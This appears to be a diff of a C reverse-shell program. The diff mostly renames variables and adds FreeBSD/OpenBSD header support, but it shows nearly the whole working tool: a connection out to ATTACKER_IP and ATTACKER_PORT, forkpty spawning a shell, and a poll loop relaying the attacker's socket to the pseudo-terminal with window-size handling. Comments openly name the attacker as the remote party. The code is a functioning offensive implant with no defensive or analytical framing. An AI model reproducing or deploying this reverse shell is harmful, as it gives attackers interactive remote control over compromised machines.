@@ -9,9 +9,11 @@
 #include <sys/errno.h>
 #include <sys/ioctl.h>
 
-#if defined(__linux__) || defined(__MSYS__)
+#if defined(__linux__)
     #include <pty.h>
-#elif defined(__APPLE__)
+#elif defined(__FreeBSD__)
+    #include <libutil.h>
+#elif defined(__OpenBSD__) || defined(__NetBSD__) || defined(__APPLE__)
     #include <util.h>
 #endif
 
@@ -24,7 +26,7 @@ typedef struct sockaddr sockaddr;
 typedef struct pollfd pollfd;
 typedef struct winsize winsize;
 
-void monitor_fd(int socket_fd, int pty_fd)
+void monitor_fd(int client_socket, int pty)
 {
     // Buffer to temporarily store the
     // data before sending over the network
@@ -46,15 +48,15 @@ void monitor_fd(int socket_fd, int pty_fd)
     // window size changes
     uint8_t marker = 0xFF;
 
-    // Struct to hold properties of the socket
+    // Struct to hold properties of the window size
     winsize ws;
 
     // Socket FD
-    fds[0].fd = socket_fd;
+    fds[0].fd = client_socket;
     fds[0].events = POLLIN;
 
     // PTY FD
-    fds[1].fd = pty_fd;
+    fds[1].fd = pty;
     fds[1].events = POLLIN;
 
     // Keep looping until the attacker
@@ -73,37 +75,32 @@ void monitor_fd(int socket_fd, int pty_fd)
             break;
         }
         
-        // This is the main flow of the program
-        //
-        // Here we will monitor for any I/O
-        // events from the file descriptors
-
         // Socket -> PTY
         if (fds[0].revents & (POLLIN | POLLHUP))
         {
             // Check if we read 0xFF from the attacker
             // This indicates that we need a window size change
-            peek = recv(socket_fd, &marker, sizeof(uint8_t), MSG_PEEK);
+            peek = recv(client_socket, &marker, sizeof(uint8_t), MSG_PEEK);
             if (peek == 1 && marker == 0xFF)
             {
                 // Consume the marker byte 0xFF
-                read(socket_fd, &marker, 1);
+                read(client_socket, &marker, 1);
 
                 // Once we have consumed the marker byte,
                 // we need to now read the data containing
                 // the new window size
-                if (read(socket_fd, &ws, sizeof(ws)) == sizeof(ws))
+                if (read(client_socket, &ws, sizeof(ws)) == sizeof(ws))
                 {
                     // If the read was successful, we now
                     // apply the new window size to
                     // the PTY
-                    ioctl(pty_fd, TIOCSWINSZ, &ws);
+                    ioctl(pty, TIOCSWINSZ, &ws);
                 }
                 continue;
             }
 
             // Read data from the socket
-            bytes_read = read(socket_fd, buffer, sizeof(buffer));
+            bytes_read = read(client_socket, buffer, sizeof(buffer));
 
             // Check if we didn't read anything
             // and exit if nothing is read
@@ -111,14 +108,14 @@ void monitor_fd(int socket_fd, int pty_fd)
 
             // Write to the PTY we created
             // Exit if we couldn't write to the PTY
-            if (write(pty_fd, buffer, (size_t)bytes_read) < 0) break;
+            if (write(pty, buffer, (size_t)bytes_read) < 0) break;
         }
 
         // PTY -> socket
         if (fds[1].revents & (POLLIN | POLLHUP))
         {
             // Read data from the PTY
-            bytes_read = read(pty_fd, buffer, sizeof(buffer));
+            bytes_read = read(pty, buffer, sizeof(buffer));
 
             // Check if we didn't read anything
             // and exit if nothing is read
@@ -126,7 +123,7 @@ void monitor_fd(int socket_fd, int pty_fd)
 
             // Write to the socket we created
             // Exit if we couldn't write to the socket
-            if (write(socket_fd, buffer, (size_t)bytes_read) < 0) break;
+            if (write(client_socket, buffer, (size_t)bytes_read) < 0) break;
         }
 
         // Check for any error events
@@ -135,10 +132,10 @@ void monitor_fd(int socket_fd, int pty_fd)
     }
 }
 
-void create_pty(int socket_fd)
+void create_pty(int client_socket)
 {
     // File descriptor used for I/O for PTY
-    int pty_fd;
+    int pty;
 
     // Hold pid values for child processes
     pid_t shell_pid, relay_pid;
@@ -148,7 +145,7 @@ void create_pty(int socket_fd)
     //
     // pty_fd will hold the PTY device itself
     // shell_pid will hold the child process that runs the shell
-    shell_pid = forkpty(&pty_fd, NULL, NULL, NULL);
+    shell_pid = forkpty(&pty, NULL, NULL, NULL);
 
     // Check if child process creation failed
     if (shell_pid < 0)
@@ -196,9 +193,9 @@ void create_pty(int socket_fd)
     // child process
     if (relay_pid == 0)
     {
-        monitor_fd(socket_fd, pty_fd);
-        close(socket_fd);
-        close(pty_fd);
+        monitor_fd(client_socket, pty);
+        close(client_socket);
+        close(pty);
         waitpid(shell_pid, NULL, 0);
     }
 
@@ -209,30 +206,30 @@ void create_pty(int socket_fd)
 int connect_to_server(const char *ip, const uint16_t port)
 {
     // Socket used for network communication
-    int socket_fd;
+    int client_socket;
 
     // Struct to hold properties of the socket
-    sockaddr_in sa;
+    sockaddr_in socket_address;
 
     // Define properties of the socket
     // Use IPv4 for network communication
-    sa.sin_family = AF_INET;
+    socket_address.sin_family = AF_INET;
 
     // Convert string representation of
     // IP to an actual number
-    sa.sin_addr.s_addr = inet_addr(ip);
+    socket_address.sin_addr.s_addr = inet_addr(ip);
 
     // Change the byte order of the integer
     // to network byte order
-    sa.sin_port = htons(port);
+    socket_address.sin_port = htons(port);
 
     // Create the socket that will be used
     // to communicate over the network
     // AF_INET -> Use IPv4
     // SOCK_STREAM -> Use connection oriented socket (TCP) (reliable byte stream)
     // IPPROTO_TCP -> Use TCP protocol
-    socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (socket_fd < 0)
+    client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (client_socket< 0)
     {
         perror("socket");
         exit(EXIT_FAILURE);
@@ -240,19 +237,19 @@ int connect_to_server(const char *ip, const uint16_t port)
 
     // Connect to the attacker using the socket
     // we just created.
-    if (connect(socket_fd, (sockaddr*)&sa, sizeof(sa)) != 0)
+    if (connect(client_socket, (sockaddr*)&socket_address, sizeof(socket_address)) != 0)
     {
         perror("connect");
         exit(EXIT_FAILURE);
     }
-    return socket_fd;
+    return client_socket;
 }
 
 int main(void)
 {
     // Connect to the attacker's machine
     // using the IP and port
-    int socket_fd = connect_to_server(ATTACKER_IP, ATTACKER_PORT);
-    create_pty(socket_fd);
+    int client_socket = connect_to_server(ATTACKER_IP, ATTACKER_PORT);
+    create_pty(client_socket);
     return 0;
 }
